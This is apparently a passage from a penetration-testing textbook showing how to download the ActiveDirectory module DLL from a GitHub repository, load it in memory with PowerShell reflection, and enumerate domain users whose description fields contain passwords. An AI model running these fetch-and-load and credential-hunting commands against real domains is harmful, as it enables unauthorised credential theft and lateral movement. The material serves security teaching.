```
```powershell
iwr -uri "https://github.com/m4lwhere/AD-Module/raw/main/Microsoft.ActiveDirectory.Management.dll" -outfile ~\AD.dll

$ad = [System.Reflection.Assembly]::Load(([byte[]]([IO.File]::ReadAllBytes ("C:\Users\Chris\AD.dll"))));

Import-Module -Assembly $ad
```
```

![](bbox=[0.107, 0.226, 0.894, 0.532])

**FIGURE 7.4** Showing that the ActiveDirectory module is not installed by attempting to use the Get-ADUser cmdlet, installing the ActiveDirectory signed module in memory through PowerShell Invoke-Expression (aliased as iex), and then showing access to Get-ADUser.

Now that we have imported this module, we can start enumerating users directly from the connected AD domain. Again, we are very interested in user descriptions since it is common for sysadmins to place passwords in the description box. Let’s try to identify all accounts on the domain that have a description — the command below searches based on a filter where the Description is not null.

```
```powershell
Get-ADUser -Filter {Description -like "*"} -Properties * | Select-Object
samAccountName, Enabled, Description
```
```

Now this gives us a nice table and check it out! Looks like there are at least two accounts with a password in the description. Note that one is labeled as disabled, but there is a very high likelihood that the same password is assigned to other accounts in the domain.

![](bbox=[0.107, 0.813, 0.894, 0.919])

**FIGURE 7.5** Using the Get-ADUser cmdlet to gather account names and descriptions.